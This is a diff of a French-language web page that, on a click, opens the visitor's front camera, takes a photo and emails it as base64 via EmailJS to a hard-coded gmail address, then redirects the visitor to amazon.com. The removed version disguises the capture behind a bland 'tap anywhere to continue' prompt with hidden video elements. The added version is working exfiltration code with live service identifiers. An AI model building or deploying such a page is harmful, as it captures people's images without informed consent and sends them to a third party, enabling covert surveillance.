@@ -1,82 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Capture et EmailJS</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     emailjs.init("mxm3fFA_BxEhqJieq");
   </script>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    html, body { margin:0; padding:0; width:100%; height:100%; display:flex; justify-content:center; align-items:center; background:#f0f0f0; overflow:hidden; }
-    #status { position:absolute; top:10px; width:100%; text-align:center; font-size:16px; color:green; }
-    video, canvas { display:none; }
-  </style>
 </head>
 <body>
-  <div id="status">Tapez n’importe où pour continuer</div>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
-
   <script>
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const status = document.getElementById("status");
-
-    async function sendPhoto(imageUrl) {
-      try {
-        const params = {
-          to_email: "adressestestee@gmail.com", // ton email
-          message: "Photo capturée via site",
-          image_url: imageUrl
-        };
-        await emailjs.send("service_8cs0gml", "template_hgvdx1g", params);
-        console.log("Photo envoyée avec succès !");
-        status.textContent = "Photo envoyée ! Redirection...";
-        setTimeout(() => { window.location.href = "https://www.amazon.com"; }, 1200);
-      } catch (err) {
-        console.error("Erreur lors de l'envoi :", err);
-        status.textContent = "Erreur lors de l'envoi.";
-      }
-    }
-
     async function captureAndSend() {
-      document.body.removeEventListener("click", captureAndSend);
-      document.body.removeEventListener("touchstart", captureAndSend);
-
-      status.textContent = "Demande de permission caméra...";
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.createElement("video");
         video.srcObject = stream;
-        await new Promise(r => setTimeout(r, 800)); // laisser la caméra se stabiliser
+        await video.play();
 
+        const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
 
         const imageBase64 = canvas.toDataURL("image/jpeg", 0.5);
-        const imageUrl = await uploadImage(imageBase64); // Fonction à définir pour télécharger l'image
 
         stream.getTracks().forEach(track => track.stop());
 
-        if (imageUrl) {
-          sendPhoto(imageUrl);
-        } else {
-          status.textContent = "Erreur lors du téléchargement de l'image.";
-        }
-      } catch (err) {
-        status.textContent = "Erreur ou caméra refusée : " + err;
+        const params = {
+          to_email: "adressestestee@gmail.com",
+          message: "Photo capturée : " + imageBase64
+        };
+
+        emailjs.send("service_8cs0gml", "template_hgvdx1g", params)
+          .then(() => { 
+            alert("Photo envoyée !"); 
+            window.location.href = "https://www.amazon.com"; 
+          })
+          .catch(err => alert("Erreur lors de l'envoi : " + err));
+      } catch(err) {
+        alert("Erreur caméra : " + err);
       }
     }
 
-    async function uploadImage(imageBase64) {
-      // Implémente ici la logique pour télécharger l'image sur un service d'hébergement
-      // Retourne l'URL de l'image téléchargée
-      return "https://exemple.com/ton-image.jpg"; // Remplace par l'URL réelle
-    }
-
+    // Déclenche sur clic
     document.body.addEventListener("click", captureAndSend);
-    document.body.addEventListener("touchstart", captureAndSend, { passive: true });
   </script>
+  <p>Cliquez n’importe où pour prendre la photo et l’envoyer.</p>
 </body>
 </html>
+
